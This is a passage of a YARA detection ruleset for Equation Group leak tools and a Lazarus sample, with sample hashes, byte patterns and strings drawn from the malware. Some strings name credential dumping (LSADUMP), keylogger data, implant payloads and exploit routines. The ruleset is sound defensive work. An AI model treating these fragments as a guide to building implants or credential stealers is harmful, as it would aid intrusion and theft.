3f 6e c6 44 24 40 45 c6 44 24 41 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_ParseCapture_RID36C5 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:10:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c732d790088a4db148d3291a92de5a449e409704b12e00c7508d75ccd90a03f2\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"* Encrypted log found.  An encryption key must be provided\" fullword ascii\n      $x2 = \"encryptionkey = e.g., \\\"00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff\\\"\" fullword ascii\n      $x3 = \"Decrypting with key '%02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x'\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_ActiveDirectory_Target_RID3ACD : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 20:02:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"33c1b7fdee7c70604be1e7baa9eea231164e62d5d5090ce7f807f43229fe5c36\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"(&(objectCategory=person)(objectClass=user)(cn=\" fullword wide\n      $s2 = \"(&(objectClass=user)(objectCategory=person)\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_PC_Legacy_dll_RID36D8 : APT DEMO EXE FILE HIGHVOL {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:13:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0cbc5cc2e24f25cb645fb57d6088bcfb893f9eb9f27f8851503a1b33378ff22d\"\n      tags = \"APT, DEMO, EXE, FILE, HIGHVOL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 45 f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 } \n      $op2 = { 49 c6 45 e1 73 c6 45 e2 57 c6 45 e3 } \n      $op3 = { 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 6f c6 45 ea } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_svctouch_RID3565 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:11:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"96b6a3c4f53f9e7047aa99fd949154745e05dc2fd2eb21ef6f0f9b95234d516b\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Causes: Firewall,Machine down,DCOM disabled\\\\not supported,etc.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 10KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_pwd_Implant_RID3675 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:56:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ee72ac76d82dfec51c8fbcfb5fc99a0a45849a4565177e01d8d23a358e52c542\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"7\\\"7(7/7>7O7]7o7w7\" fullword ascii\n      $op1 = { 40 50 89 44 24 18 FF 15 34 20 00 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_KisuComms_Target_2000_RID3978 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:05:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"94eea1bad534a1dc20620919de8046c9966be3dd353a50f25b719c3662f22135\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"363<3S3c3l3q3v3{3\" fullword ascii\n      $s2 = \"3!3%3)3-3135393@5\" fullword ascii\n      $op0 = { eb 03 89 46 54 47 83 ff 1a 0f 8c 40 ff ff ff 8b } \n      $op1 = { 8b 46 04 85 c0 74 0f 50 e8 34 fb ff ff 83 66 04 } \n      $op2 = { c6 45 fc 02 8d 8d 44 ff ff ff e8 d2 2f 00 00 eb } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( all of ( $s* ) or all of ( $op* ) ) )\n}\n\nrule EquationGroup_Toolset_Apr17_SlDecoder_RID356B : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:12:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b220f51ca56d9f9d7d899fa240d3328535f48184d136013fd808d8835919f9ce\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Error in conversion. SlDecoder.exe <input filename> <output filename> at command line \" fullword wide\n      $x2 = \"KeyLogger_Data\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Windows_Implant_RID3815 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:06:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d38ce396926e45781daecd18670316defe3caf975a3062470a87c1d181a61374\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"0#0)0/050;0M0Y0h0|0\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_msgkd_msslu64_msgki_mssld_RID3C05 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 20:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9ab667b7b5b9adf4ff1d6db6f804824a22c7cc003eb4208d5b2f12809f5e69d0\"\n      hash2 = \"320144a7842500a5b69ec16f81a9d1d4c8172bb92301afd07fb79bc0eca81557\"\n      hash3 = \"c10f4b9abee0fde50fe7c21b9948a2532744a53bb4c578630a81d2911f6105a3\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"PQRAPAQSTUVWARASATAUAVAW\" fullword ascii\n      $s2 = \"SQRUWVAWAVAUATASARAQAP\" fullword ascii\n      $s3 = \"iijymqp\" fullword ascii\n      $s4 = \"AWAVAUATASARAQI\" fullword ascii\n      $s5 = \"WARASATAUAVM\" fullword ascii\n      $op1 = { 0c 80 30 02 48 83 c2 01 49 83 e9 01 75 e1 c3 cc } \n      $op2 = { e8 10 66 0d 00 80 66 31 02 48 83 c2 02 49 83 e9 } \n      $op3 = { 48 b8 53 a5 e1 41 d4 f1 07 00 48 33 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of ( $s* ) or all of ( $op* ) )\n}\n\nrule EquationGroup_Toolset_Apr17_SetCallback_RID362F : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:45:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a8854f6b01d0e49beeb2d09e9781a6837a0d18129380c6e1b1629bc7c13fdea2\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"*NOTE: This version of SetCallback does not work with PeddleCheap versions prior\" fullword ascii\n      $s3 = \"USAGE: SetCallback <input file> <output file>\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17__vtuner_vtuner_1_RID388C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:25:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3e6bec0679c1d8800b181f3228669704adb2e9cbf24679f4a1958e4cdd0e1431\"\n      hash2 = \"b0d2ebf455092f9d1f8e2997237b292856e9abbccfbbebe5d06b382257942e0e\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Unable to get -w hash.  %x\" fullword wide\n      $s2 = \"!\\\"invalid instruction mnemonic constant Id3vil\\\"\" fullword wide\n      $s4 = \"Unable to set -w provider. %x\" fullword wide\n      $op0 = { 2b c7 50 e8 3a 8c ff ff ff b6 c0 } \n      $op2 = { a1 8c 62 47 00 81 65 e0 ff ff ff 7f 03 d8 8b c1 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them )\n}\n\nrule EquationGroup_Toolset_Apr17__ecwi_ESKE_EVFR_RPC2_2_RID391D : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:50:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c4152f65e45ff327dade50f1ac3d3b876572a66c1ce03014f2877cea715d9afd\"\n      hash2 = \"9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556\"\n      hash3 = \"c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Target is share name\" fullword ascii\n      $s2 = \"Could not make UdpNetbios header -- bailing\" fullword ascii\n      $s3 = \"Request non-NT session key\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17__EAFU_ecwi_ESKE_EVFR_RPC2_4_RID3A9F : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:54:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3e181ca31f1f75a6244b8e72afaa630171f182fbe907df4f8b656cc4a31602f6\"\n      hash2 = \"c4152f65e45ff327dade50f1ac3d3b876572a66c1ce03014f2877cea715d9afd\"\n      hash3 = \"9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"* Listening Post DLL %s() returned error code %d.\" fullword ascii\n      $s1 = \"WsaErrorTooManyProcesses\" fullword ascii\n      $s2 = \"NtErrorMoreProcessingRequired\" fullword ascii\n      $s3 = \"Connection closed by remote host (TCP Ack/Fin)\" fullword ascii\n      $s4 = \"ServerErrorBadNamePassword\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of ( $s* ) or 1 of ( $x* ) )\n}\n\nrule EquationGroup_Toolset_Apr17__SendCFTrigger_SendPKTrigger_6_RID3D29 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 21:42:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3bee31b9edca8aa010a4684c2806b0ca988b2bcc14ad0964fec4f11f3f6fb748\"\n      hash2 = \"2f9c7a857948795873a61f4d4f08e1bd0a41e3d6ffde212db389365488fa6e26\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"* Failed to connect to destination - %u\" fullword wide\n      $s6 = \"* Failed to convert destination address into sockaddr_storage values\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17__AddResource_RID36A6 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:04:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e83e4648875d4c4aa8bc6f3c150c12bad45d066e2116087cdf78a4a4efbab6f0\"\n      hash2 = \"5a04d65a61ef04f5a1cbc29398c767eada367459dc09c54c3f4e35015c71ccff\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s cm 10 2000 \\\"c:\\\\MY DIR\\\\myapp.exe\\\" c:\\\\MyResourceData.dat\" fullword ascii\n      $s2 = \"<PE path> - the path to the PE binary to which to add the resource.\" fullword ascii\n      $s3 = \"Unable to get path for target binary.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them )\n}\n\nrule EquationGroup_Toolset_Apr17__ESKE_RPC2_8_RID358A : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:17:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556\"\n      hash2 = \"5c0896dbafc5d8cc19b1bc7924420b20ed5999ac5bee2cb5a91aada0ea01e337\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"Fragment: Packet too small to contain RPC header\" fullword ascii\n      $s5 = \"Fragment pickup: SmbNtReadX failed\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17__LSADUMP_Lp_ModifyPrivilege_Lp_PacketScan_Lp_put_Lp_RemoteExecute_Lp_Windows_Lp_wmi_Lp_9_RID53B6 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 09:10:30\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c7bf4c012293e7de56d86f4f5b4eeb6c1c5263568cc4d9863a286a86b5daf194\"\n      hash2 = \"d92928a867a685274b0a74ec55c0b83690fca989699310179e184e2787d47f48\"\n      hash3 = \"2d963529e6db733c5b74db1894d75493507e6e40da0de2f33e301959b50f3d32\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Injection Lib -  \" wide\n      $x2 = \"LSADUMP - - ERROR\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17__ETBL_ETRE_10_RID35CB : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:28:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"70db3ac2c1a10de6ce6b3e7a7890c37bffde006ea6d441f5de6d8329add4d2ef\"\n      hash2 = \"e0f05f26293e3231e4e32916ad8a6ee944af842410c194fce8a0d8ad2f5c54b2\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Probe #2 usage: %s -i TargetIp -p TargetPort -r %d [-o TimeOut] -t Protocol -n IMailUserName -a IMailPassword\" fullword ascii\n      $x6 = \"** RunExploit ** - EXCEPTION_EXECUTE_HANDLER : 0x%08X\" fullword ascii\n      $s19 = \"Sending Implant Payload.. cEncImplantPayload size(%d)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17__ELV_ESKE_ETBL_ETRE_EVFR_11_RID3A2B : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:35:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f\"\n      hash2 = \"9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556\"\n      hash3 = \"70db3ac2c1a10de6ce6b3e7a7890c37bffde006ea6d441f5de6d8329add4d2ef\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Target is vulnerable\" fullword ascii\n      $x2 = \"Target is NOT vulnerable\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RideArea2_12_RID3AA5 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:55:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f\"\n      hash2 = \"9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556\"\n      hash3 = \"c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x2 = \"** CreatePayload ** - EXCEPTION_EXECUTE_HANDLER\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17__ELV_ESKE_13_RID3586 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:16:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f\"\n      hash2 = \"9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Skip call to PackageRideArea().  Payload has already been packaged. Options -x and -q ignored.\" fullword ascii\n      $s2 = \"ERROR: pGvars->pIntRideAreaImplantPayload is NULL\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17__NameProbe_SMBTOUCH_14_RID3956 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:59:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fbe3a4501654438f502a93f51b298ff3abf4e4cad34ce4ec0fad5cb5c2071597\"\n      hash2 = \"7da350c964ea43c149a12ac3d2ce4675cedc079ddc10d1f7c464b16688305309\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"DEC Pathworks TCPIP service on Windows NT\" fullword ascii\n      $s2 = \"<\\\\\\\\__MSBROWSE__> G\" fullword ascii\n      $s3 = \"<IRISNAMESERVER>\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RPC2_15_RID3890 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:26:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f\"\n      hash2 = \"9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556\"\n      hash3 = \"c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"** SendAndReceive ** - EXCEPTION_EXECUTE_HANDLER\" fullword ascii\n      $s8 = \"Binding to RPC Interface %s over named pipe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_16_RID371B : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:24:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f7fad44560bc8cc04f03f1d30b6e1b4c5f049b9a8a45464f43359cbe4d1ce86f\"\n      hash2 = \"9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556\"\n      hash3 = \"c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ERROR: TbMalloc() failed for encoded exploit payload\" fullword ascii\n      $x2 = \"** EncodeExploitPayload ** - EXCEPTION_EXECUTE_HANDLER\" fullword ascii\n      $x4 = \"** RunExploit ** - EXCEPTION_EXECUTE_HANDLER\" fullword ascii\n      $s6 = \"Sending Implant Payload (%d-bytes)\" fullword ascii\n      $s7 = \"ERROR: Encoder failed on exploit payload\" fullword ascii\n      $s11 = \"ERROR: VulnerableOS() != RET_SUCCESS\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17__ETBL_ETRE_SMBTOUCH_17_RID3896 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:27:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"70db3ac2c1a10de6ce6b3e7a7890c37bffde006ea6d441f5de6d8329add4d2ef\"\n      hash2 = \"e0f05f26293e3231e4e32916ad8a6ee944af842410c194fce8a0d8ad2f5c54b2\"\n      hash3 = \"7da350c964ea43c149a12ac3d2ce4675cedc079ddc10d1f7c464b16688305309\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ERROR: Connection terminated by Target (TCP Ack/Fin)\" fullword ascii\n      $s2 = \"Target did not respond within specified amount of time\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )\n}\n\nrule Enigma_Protector_LazarusSample_RID3326 : APT DEMO EXE FILE T1027_002 {\n   meta:\n      description = \"Detects malware packed with the Enigma protector\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/sas/77908/lazarus-under-the-hood/\"\n      date = \"2017-04-12 14:35:31\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d4616f9706403a0d5a2f9a8726230a4693e4c95c58df5c753ccc684f1d3542e2\"\n      tags = \"APT, DEMO, EXE, FILE, T1027_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 5d 5d 5d aa bf 5e 95 d6 dc 51 5d 5d 5d 5e 98 0d } \n      $op2 = { 52 d9 47 5d 5d 5d dd a6 b4 52 d9 4c 5d 5d 5d 3b } \n      $op3 = { 9f 59 14 52 d8 a9 a2 a2 a2 00 9f 51 5d d6 d1 79 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}\n\nrule EquationGroup_store_linux_i386_v_3_3_0_RID3570 : APT DEMO FILE G0020 LINUX {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 16:13:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"abc27fda9a0921d7cf2863c29768af15fdfe47a0b3e7a131ef7e5cc057576fbc\"\n      tags = \"APT, DEMO, FILE, G0020, LINUX\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[-] Failed to map file: %s\" fullword ascii\n      $s2 = \"[-] can not NULL terminate input data\" fullword ascii\n      $s3 = \"[!] Name has size of 0!\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 60KB and all of them )\n}\n\nrule EquationGroup_morerats_client_genkey_RID35F0 : APT DEMO G0020 